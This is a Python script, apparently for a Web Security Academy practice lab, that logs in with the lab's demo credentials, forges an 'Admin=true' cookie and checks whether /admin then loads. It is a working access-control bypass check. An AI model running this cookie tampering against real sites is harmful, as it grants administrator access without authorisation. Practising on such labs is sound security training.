import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def checkCookie(url):
    # print("asdgjasgd")
    # test on HTML forms
    forms = get_all_forms(url)
    # print(forms)
    # print(get_form_details(forms[0]))
    
    for form in forms:
        form_details = get_form_details(form)
        # the data body we want to submit
        data = {}
        for input_tag in form_details["inputs"]:
            if input_tag["value"] or input_tag["type"] == "hidden":
                # any input form that has some value or hidden,
                # just use it in the form body
                try:
                    # data[input_tag["name"]] = input_tag["value"] + c
                    data[input_tag["name"]] = input_tag["value"]
                except:
                    pass
            elif input_tag["type"] != "submit":
                # all others except submit, use some junk data with special character
                if input_tag["name"] == "username":
                    data[input_tag["name"]] = f"wiener"
                    # print("1:", input_tag["name"])
                else:
                    data[input_tag["name"]] = f"peter"
                    # print(input_tag["name"])
                # form_details[input_tag["name"]] = f"peter"
        # join the url with the action (form request URL)
        url = urljoin(url, form_details["action"])
        if form_details["method"] == "post":
            # print('method: POST')
            res = s.post(url, data=data)
            cookies = s.cookies
            # print("Cookies:")
            for cookie_name, cookie_data in cookies.items():
                if cookie_name == "Admin":
                    del s.cookies[cookie_name]
                    s.cookies[cookie_name] = "true"
                    # print(f'{cookie_name} : {cookie_data}')
                # print(f"{cookie_name}: {cookie_data}")
            # print(data)
            respone = s.get(url.replace("/login","")+"/admin")
            if respone.status_code == 200:
                return True
            #     print("[+] Detected cookie save status Admin")
            # print(respone.status_code)
        elif form_details["method"] == "get":
            res = s.get(url, params=data)
    return False

# checkCookie("https://0a61005303a01e6f84f6b530002f006d.web-security-academy.net/login")